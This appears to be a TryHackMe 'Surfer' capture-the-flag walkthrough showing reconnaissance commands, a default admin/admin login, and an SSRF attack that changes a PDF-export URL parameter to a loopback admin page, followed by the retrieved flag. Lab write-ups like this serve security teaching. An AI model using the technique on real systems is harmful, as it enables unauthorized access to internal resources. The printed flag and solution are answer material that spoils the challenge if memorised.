# TryHackMe — Surfer

### Challenge Link: https://tryhackme.com/room/surfer

## Overview

This repository documents the methodology used to solve the **Surfer** web security challenge on TryHackMe. The assessment involved web reconnaissance, directory enumeration, authentication analysis, HTTP request interception, and exploitation of a Server-Side Request Forgery (SSRF) vulnerability.

| Attribute | Details |
|---|---|
| Challenge | Surfer |
| Platform | TryHackMe |
| Target IP | `<TARGET-IP>` |
| Target URL | `http://<TARGET-IP>` |
| Category | Web Application Security |
| Primary Vulnerability | Server-Side Request Forgery (SSRF) |
| Tools | Kali Linux, Burp Suite, cURL, Gobuster, Nmap |
| Status | Completed |

> **Disclaimer:** This walkthrough is intended for authorized cybersecurity labs and educational purposes. Perform security testing only on systems you are permitted to assess.

## Solution Walkthrough

### 1. Initial Reconnaissance

First, inspect the target web application:

```bash
curl -i http://<TARGET-IP>/
```

Perform service discovery:

```bash
nmap -sV -sC -p 80 <TARGET-IP>
```

The objective is to identify the web service and determine which application endpoints are available for further investigation.

### 2. Inspect robots.txt

Retrieve the application's `robots.txt` file:

```bash
curl -i http://<TARGET-IP>/robots.txt
```

The file revealed a disallowed path:

```text
Disallow: /backup/chat.txt
```

A path listed in `robots.txt` is not necessarily protected. It may still be directly accessible.

### 3. Examine the Exposed Backup File

Retrieve the discovered file:

```bash
curl -i http://<TARGET-IP>/backup/chat.txt
```

The conversation contained references to:

- A newly configured `export2pdf` tool.
- Daily PDF system reports.
- An internal server that was expected to serve the flag.
- A reminder to change weak credentials.

These clues suggested investigating the PDF export functionality and identifying the application's internal resources.

### 4. Enumerate Directories

Use Gobuster to identify additional application paths:

```bash
gobuster dir \
  -u http://<TARGET-IP>/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt,bak
```

The enumeration identified several useful paths, including:

```text
/login.php
/logout.php
/backup/
/internal/
/server-info.php
/vendor/
```

Further enumeration of the internal directory identified:

```text
/internal/admin.php
```

A direct request to this page returned:

```text
This page can only be accessed locally.
```

This indicated that the application was enforcing a local-access restriction on the internal page.

### 5. Authenticate to the Application

The login page was available at:

```text
http://<TARGET-IP>/login.php
```

During the challenge, the credentials below successfully authenticated to the application:

```text
Username: admin
Password: admin
```

After logging in, the dashboard exposed an **Export to PDF** feature.

Use only the credentials supplied or discovered within the authorized challenge environment.

### 6. Analyze the PDF Export Functionality

The dashboard contained a form similar to:

```html
<form action="export2pdf.php" method="POST">
    <input
        type="hidden"
        id="url"
        name="url"
        value="http://127.0.0.1/server-info.php"
    >
    <button type="submit">Export to PDF</button>
</form>
```

The form submitted a URL to `export2pdf.php` using the HTTP POST method.

The important observation was that the URL was supplied through a request parameter. If the backend fetched arbitrary URLs without sufficient validation, it could potentially be abused to access internal resources.

### 7. Intercept the Request Using Burp Suite

Configure the browser to use Burp Suite's proxy, log in to the application, and click **Export to PDF**.

The intercepted request contained:

```http
POST /export2pdf.php HTTP/1.1
Host: <TARGET-IP>
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=<your-session-cookie>

url=http%3A%2F%2F127.0.0.1%2Fserver-info.php
```

The session cookie was required to preserve the authenticated session.

Send the request to **Burp Repeater** so that the parameter can be modified and tested.

### 8. Exploit the SSRF Vulnerability

The original URL pointed to the local server information page:

```text
http://127.0.0.1/server-info.php
```

Change the `url` parameter to the internal admin page:

```text
http://127.0.0.1/internal/admin.php
```

The URL-encoded request body becomes:

```text
url=http%3A%2F%2F127.0.0.1%2Finternal%2Fadmin.php
```

Send the modified request using Burp Repeater.

The application generated a PDF for the supplied URL. Because the PDF-generation component fetched the URL from the server side, it could access a local resource that was not directly accessible through an ordinary external request.

This behavior demonstrated **Server-Side Request Forgery (SSRF)**.

### 9. Extract the Flag from the PDF

Inspect the HTTP response and retrieve the generated PDF. If the file is saved as `export.pdf`, extract its text using:

```bash
pdftotext export.pdf -
```

The generated PDF contained:

```text
Report generated for http://127.0.0.1/internal/admin.php
flag{6255c55660e292cf0116c053c9937810}
```

This confirmed successful retrieval of the challenge flag.

## Vulnerability Analysis

### Server-Side Request Forgery (SSRF)

**Description:** SSRF occurs when an application makes server-side requests to a URL controlled or influenced by a user without adequate destination validation.

In this challenge, the PDF export endpoint accepted a URL and fetched its contents to generate a report. Changing the URL to a loopback address allowed the server-side component to request an internal application page.

### Attack Flow

1. Discover the exposed backup conversation.
2. Identify the PDF export functionality.
3. Authenticate and inspect the export request.
4. Modify the URL parameter to reference the internal page.
5. Submit the request to the server.
6. Retrieve the generated PDF.
7. Extract the flag from the PDF content.